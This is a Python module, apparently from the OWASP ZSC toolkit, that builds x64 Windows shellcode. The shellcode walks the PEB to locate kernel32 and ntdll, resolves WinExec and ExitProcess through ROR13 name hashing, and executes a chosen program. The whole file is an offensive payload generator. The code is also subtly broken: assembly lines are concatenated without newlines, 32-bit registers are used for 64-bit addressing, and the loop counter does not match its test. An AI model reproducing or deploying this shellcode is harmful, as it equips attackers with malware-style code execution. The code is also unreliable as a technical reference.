"""
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
"""

# from math import ceil
# import sys
from new_cores import base_module
# sys.path.insert(0, 'C:\\Users\\Nikhil\Desktop\\vagrant\\OWASP-ZSC')
from cores import stack


class Module(base_module.BaseModule):
    dest_file = base_module.OptString("notepad.exe", "File to execute")

    def generate(self, dest):
        payload = "bits 64"
        payload += "section .text"
        payload += "global start"
        payload += ""
        payload += "start:"
        payload += ";get dll base addresses"
        payload += "    sub rsp, 20h                     ;reserve stack space for called functions"
        payload += "    and rsp, 0fffffffffffffff0h      ;make sure stack 16-byte aligned   "
        payload += "     "
        payload += "    mov r12, [gs:60h]                ;peb"
        payload += "    mov r12, [r12 + 0x18]            ;Peb --> LDR"
        payload += "    mov r12, [r12 + 0x20]            ;Peb.Ldr.InMemoryOrderModuleList"
        payload += "    mov r12, [r12]                   ;2st entry"
        payload += "    mov r15, [r12 + 0x20]            ;ntdll.dll base address!"
        payload += "    mov r12, [r12]                   ;3nd entry"
        payload += "    mov r12, [r12 + 0x20]            ;kernel32.dll base address!"
        payload += " "
        payload += ";find address of winexec from kernel32.dll which was found above. "
        payload += "    mov rdx, 0xe8afe98                ; hash of winexec given to rdx "
        payload += "    mov rcx, r12                    ; rcx has dll address now"
        payload += "    mov r12, r12"
        payload += "    call GetProcessAddress           ; give arguments in rdx and rcx and get rax back with winexex"
        payload += "     "
        payload += "; the winexec call"
        payload += "    jmp GetProgramName"
        payload += ""
        payload += "ExecProgram:"
        payload += "    pop rcx                         ;rcx has the handle to the calc.exe string (1st argument)"
        payload += "    mov edx, 1"
        payload += "    call rax"
        payload += "                 "
        payload += ";ExitProcess"
        payload += "    mov rdx, 0x2d3fcd70                "
        payload += "    mov rcx, r15"
        payload += "    call GetProcessAddress"
        payload += "    xor  rcx, rcx                  ;uExitCode"
        payload += "    call rax       "
        payload += ""
        payload += ";get program name"
        payload += "GetProgramName:"
        payload += "    call ExecProgram"
        payload += f"    db {dest}"
        payload += "    db 0x00                            ; null terminated string"
        payload += ""
        payload += ";Hashing section to resolve a function address    "
        payload += "GetProcessAddress:        "
        payload += "    mov r13, rcx              ;base address of dll loaded - rdx has winexec, rcx has kernel32 addr"
        payload += "    mov eax, [r13d + 0x3c]           ;skip DOS header and go to PE header"
        payload += "    mov r14d, [r13d + eax + 0x88]    ;0x88 offset from the PE header == the export table. "
        payload += "    add r14d, r13d             ;make the export table an absolute base address and put it in r14d."
        payload += ""
        payload += "    mov r10d, [r14d + 0x18]         ;go into the export table and get the numberOfNames "
        payload += "    mov ebx, [r14d + 0x20]          ;get the AddressOfNames offset. "
        payload += "    add ebx, r13d                   ;AddressofNames base. "
        payload += "    "
        payload += "find_function_loop:    "
        payload += "    jecxz find_function_finished   ; jump short if ecx == zero. nothing found "
        payload += "    dec r10d                       ;dec ECX by one for the loop"
        payload += "    mov esi, [ebx + r10d * 4]      ;get a name to  from the export table. "
        payload += "    add esi, r13d                  ;esi == now the current name to search on. "
        payload += "    "
        payload += "find_hashes:"
        payload += "    xor edi, edi"
        payload += "    xor eax, eax"
        payload += "    cld"
        payload += ""
        payload += ";this block computes the hash for whatever == at esi    "
        payload += "continue_hashing:    "
        payload += "    lodsb                         ;load byte at ds:esi to al"
        payload += "    test al, al                   ;is the end of string resarched?"
        payload += "    jz compute_hash_finished"
        payload += "    ror dword edi, 0xd            ;ROR13 for hash calculation!"
        payload += "    add edi, eax                    ; edi has the  hash from the hash calculation"
        payload += "    jmp continue_hashing"
        payload += ""
        payload += "; this block checks the hash and then gives back the function loaded at eax    "
        payload += "compute_hash_finished:"
        payload += "    cmp edi, edx                  ;edx has the function hash (rdx , rcx was passed on from above)"
        payload += "    jnz find_function_loop        ;didn't match, keep trying!"
        payload += "    mov ebx, [r14d + 0x24]        ;put the address of the ordinal table and put it in ebx. "
        payload += "    add ebx, r13d                 ;absolute address"
        payload += "    xor ecx, ecx                  ;ensure ecx == 0'd. "
        payload += "    mov cx, [ebx + 2 * r10d]   ;ordinal = 2 bytes. Get the current ordinal and put it in cx." \
                   " ECX was our counter for which # we were in. "
        payload += "    mov ebx, [r14d + 0x1c]        ;extract the address table offset"
        payload += "    add ebx, r13d                 ;put absolute address in EBX."
        payload += "    mov eax, [ebx + 4 * ecx]      ;relative address"
        payload += "    add eax, r13d                    ; eax has the required function given by the hash in rcx"
        payload += ""
        payload += ""
        payload += "find_function_finished:"
        payload += "    ret"
        return payload

    def run(self):
        file_dest = stack.generate(self.dest_file, "%ecx", "string")
        print(self.generate(file_dest))
